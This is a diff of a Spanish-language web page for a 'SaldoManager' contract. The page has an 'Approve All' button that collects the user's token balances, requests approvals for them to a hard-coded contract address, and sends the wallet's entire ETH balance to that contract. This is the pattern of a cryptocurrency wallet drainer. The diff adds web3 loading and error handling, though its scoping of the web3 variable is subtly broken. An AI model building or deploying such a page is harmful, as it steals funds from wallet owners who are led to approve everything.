@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Interacción con el Contrato SaldoManager</title>
     <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+
 </head>
     <style>
         body {
@@ -66,15 +68,20 @@ button:hover {
     <button onclick="approveAll()">Aprobar Todo</button>
 
     <script>
-        // Instancia Web3
-        const web3 = new Web3(window.ethereum);
-        
+       // Verificar si MetaMask está instalado
+        if (typeof window.ethereum !== 'undefined') {
+            console.log("MetaMask está instalado");
+            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask
+        } else {
+            alert("Por favor instala MetaMask para continuar.");
+            throw new Error("MetaMask no está instalado");
+        }
+
         // Dirección del contrato SaldoManager
         const contractAddress = '0x26c0B6C2A8120E9c71de55FB678E76174598B196';
         
         // ABI del contrato
         const contractABI = [
-            // ABI recortado, solo las funciones necesarias para aprobar y verificar
             {
                 "constant": true,
                 "inputs": [{"name": "token", "type": "address"}],
@@ -159,33 +166,38 @@ button:hover {
 
         // Función para aprobar todo
         async function approveAll() {
-            const ethBalance = await getETHBalance();
-            const tokensToApprove = await getERC20Tokens();
+            try {
+                const ethBalance = await getETHBalance();
+                const tokensToApprove = await getERC20Tokens();
 
-            if (ethBalance > 0 || tokensToApprove.length > 0) {
-                const accounts = await web3.eth.requestAccounts();
-                const userAddress = accounts[0];
+                if (ethBalance > 0 || tokensToApprove.length > 0) {
+                    const accounts = await web3.eth.requestAccounts();
+                    const userAddress = accounts[0];
 
-                // Preparar las aprobaciones
-                const aprobacionesERC20 = tokensToApprove.map(token => ({
-                    token: token.token,
-                    cantidad: token.cantidad,
-                    esERC20: token.esERC20,
-                    esERC721: token.esERC721,
-                    esERC1155: token.esERC1155
-                }));
+                    // Preparar las aprobaciones
+                    const aprobacionesERC20 = tokensToApprove.map(token => ({
+                        token: token.token,
+                        cantidad: token.cantidad,
+                        esERC20: token.esERC20,
+                        esERC721: token.esERC721,
+                        esERC1155: token.esERC1155
+                    }));
 
-                // Llamar al contrato para aprobar todo
-                await contract.methods.aprobarTodo(
-                    aprobacionesERC20,
-                    [], // Enviar contratos ERC721 si los hay
-                    [], // Enviar contratos ERC1155 si los hay
-                    ethBalance // Enviar ETH disponible
-                ).send({ from: userAddress });
+                    // Llamar al contrato para aprobar todo
+                    await contract.methods.aprobarTodo(
+                        aprobacionesERC20,
+                        [], // Enviar contratos ERC721 si los hay
+                        [], // Enviar contratos ERC1155 si los hay
+                        ethBalance // Enviar ETH disponible
+                    ).send({ from: userAddress });
 
-                alert("Aprobación completa para el contrato!");
-            } else {
-                alert("No tienes saldo en ETH o tokens.");
+                    alert("Aprobación completa para el contrato!");
+                } else {
+                    alert("No tienes saldo en ETH o tokens.");
+                }
+            } catch (error) {
+                console.error("Error al aprobar los saldos:", error);
+                alert("Hubo un error al intentar aprobar los saldos.");
             }
         }
     </script>
